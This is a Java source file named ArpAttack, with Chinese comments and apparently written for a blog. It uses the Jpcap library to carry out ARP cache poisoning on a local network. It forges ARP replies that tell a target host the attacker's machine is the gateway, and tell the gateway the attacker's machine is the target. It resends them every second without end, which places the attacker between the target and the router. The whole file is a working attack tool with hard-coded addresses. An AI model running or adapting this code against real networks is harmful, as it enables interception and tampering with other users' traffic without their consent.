package top.lemonz.blog.jpcap;

import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.packet.ARPPacket;
import jpcap.packet.EthernetPacket;

import java.net.InetAddress;
import java.util.Scanner;

/**
 * Created by IntelliJ IDEA.
 *
 * @author NingZe
 * description:
 * path: LEMONBLOG-top.lemonz.blog.ArpAttack
 * date: 2019/12/19 0019 09:53
 * version: 02.06
 * To change this template use File | Settings | File Templates.
 */
public class ArpAttack {
    public static void main(String[] args) throws Exception {
        // 重发间隔时间
        int time = 1;
        Scanner scanner = new Scanner(System.in);
        /*
         * 为了省事，本地IP，Mac地址需手动输入
         */
        String bjip = "192.168.9.206";
        System.out.println("本机IP地址：" + bjip);
        InetAddress myIp = InetAddress.getByName(bjip);
        String mmac = "00-F1-F3-A7-2E-C1";
        byte[] myMac = stomac(mmac);
        System.out.println("本机Mac地址：" + mmac);

        // 目标主机的IP与Mac
        String mbip = "192.168.9.113";
        System.out.println("目标IP地址：" + mbip);
        InetAddress targetIp = InetAddress.getByName(mbip);
        String tarmac = NetUtil.getMacAddress(targetIp.getHostAddress());
        byte[] targetMac = stomac(tarmac);
        System.out.println("查找后目标Mac地址：" + tarmac);

        // 网关的IP与Mac
        String wwip = "192.168.9.1";
        System.out.println("网关IP地址：" + wwip);
        InetAddress wanIp = InetAddress.getByName(wwip);
        String wmac = NetUtil.getMacAddress(wanIp.getHostName());
        byte[] wanMac = stomac(wmac);
        System.out.print("查找后网关Mac地址：" + wmac);

        System.out.println("\n-------------------------------------------------\n");

        // 枚举网卡并打开设备
        NetworkInterface[] devices = JpcapCaptor.getDeviceList();
        for (int i = 0; i < devices.length; i++) {
            System.out.println(i + "." + devices[i].description);
        }
        System.out.print("\n选择一个网卡：");
        NetworkInterface device = devices[scanner.nextInt()];

        System.out.println("\n-------------------------------------------------\n");

        JpcapSender sender = JpcapSender.openDevice(device);

        // 告诉目标主机：我是路由器（根据IP来确定身份），实则填写的却是本机的Mac地址
        ARPPacket arp1 = getARPPacket(myMac, wanIp, targetMac, targetIp);
        // 同样的方式欺骗路由器
        ARPPacket arp2 = getARPPacket(myMac, targetIp, wanMac, wanIp);
        // 在欺骗目标的同时，自己的主机ARP表也会被破坏，导致访问不到路由器
        // 所以下面两个包是告诉本机正确的IP地址对应的Mac地址
        ARPPacket arp3 = getARPPacket(wanMac, wanIp, myMac, myIp);
        ARPPacket arp4 = getARPPacket(targetMac, targetIp, myMac, myIp);

        // 发送ARP应答包
        for (int i = 1; true; i++) {
            sender.sendPacket(arp1);
            sender.sendPacket(arp2);
            sender.sendPacket(arp3);
            sender.sendPacket(arp4);

            System.out.println("已发送： " + i);
            Thread.sleep(time * 1000);
        }
    }

    /**
     * mac地址转byte数组的方法
     */
    static byte[] stomac(String s) {
        byte[] mac = new byte[]{(byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00};
        String[] s1 = s.split("-");
        for (int x = 0; x < s1.length; x++) {
            mac[x] = (byte) ((Integer.parseInt(s1[x], 16)) & 0xff);
        }
        return mac;
    }

    /**
     * 构造ARP包的方法
     */
    public static ARPPacket getARPPacket(byte[] sender_hardaddr, InetAddress sender_protoaddr,
                                         byte[] target_hardaddr, InetAddress target_protoaddr) {

        ARPPacket arp = new ARPPacket();

        arp.hardtype = ARPPacket.HARDTYPE_ETHER;
        arp.prototype = ARPPacket.PROTOTYPE_IP;
        arp.operation = ARPPacket.ARP_REPLY;
        arp.hlen = 6;
        arp.plen = 4;
        arp.sender_hardaddr = sender_hardaddr;
        arp.sender_protoaddr = sender_protoaddr.getAddress();
        arp.target_hardaddr = target_hardaddr;
        arp.target_protoaddr = target_protoaddr.getAddress();

        EthernetPacket ether = new EthernetPacket();
        ether.frametype = EthernetPacket.ETHERTYPE_ARP;
        ether.src_mac = sender_hardaddr;
        ether.dst_mac = target_hardaddr;
        arp.datalink = ether;

        return arp;
    }
}
